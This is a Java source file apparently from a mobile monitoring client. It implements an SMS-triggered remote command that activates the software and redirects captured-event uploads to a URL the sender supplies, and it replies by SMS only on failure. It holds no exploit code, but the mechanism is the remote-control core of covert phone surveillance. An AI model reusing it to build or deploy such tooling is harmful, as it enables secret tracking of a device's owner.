package com.vvt.rmtcmd.pcc;

import com.vvt.encryption.AESEncryptor;
import com.vvt.encryption.AESKeyGenerator;
import com.vvt.global.Global;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.prot.command.response.SendActivateCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendActivateManager;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class PCCActivateACURL extends PCCRmtCmdAsync implements PhoenixProtocolListener, SMSSendListener {
		
	private SendActivateManager actManager = Global.getSendActivateManager();
	private SMSSender smsSender = Global.getSMSSender();
	private FxSMSMessage smsMessage = new FxSMSMessage();
	private String activationCode = null;
	private String url = null;
	private boolean isReply;
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public PCCActivateACURL(String activationCode, String url, String recipentNumber, boolean isReply) {
		this.activationCode = activationCode;
		this.url = url;
		if (recipentNumber != null) {
			this.isReply = isReply;
			smsMessage.setNumber(recipentNumber);			
		}
	}
	
	private void send() {
		if (isReply) {
			smsSender.send(smsMessage);
		}
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.ACTIVATE_WITH_AC_URL.getId());
		try {
			if (!url.endsWith("/")) {
				url += "/";
			}
			url += "gateway";
			String http = "http://";
			if (!url.startsWith(http)) {
				url = http.concat(url);
			}
			byte[] key = AESKeyGenerator.generateAESKey();
			byte[] encryptedUrl = AESEncryptor.encrypt(key, url.getBytes());
			serverUrl.setServerActivationUrl(key, encryptedUrl);
			serverUrl.setServerDeliveryUrl(key, encryptedUrl);
			actManager.addListener(this);
			actManager.activate(activationCode);
		} catch(Exception e) {
			actManager.removeListener(this);
			observer.cmdExecutedError(this);
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			createSystemEventOut(responseMessage.toString());			
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
			// To send events
			eventSender.sendEvents();
		}
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
	
	public void onError(String message) {
		actManager.removeListener(this);
		observer.cmdExecutedError(this);
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	public void onSuccess(CommandResponse response) {
		actManager.removeListener(this);
		if (response instanceof SendActivateCmdResponse) {
			SendActivateCmdResponse sendActRes = (SendActivateCmdResponse)response;
			if (sendActRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.ACT_SUCCESS);
				observer.cmdExecutedSuccess(this);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendActRes.getServerMsg());		
				observer.cmdExecutedError(this);
			}
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// TODO: As requirement that client will reply only if failed.
			/*// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();*/
			// To send events
			eventSender.sendEvents();
		}
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("PCCActivateACURL.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
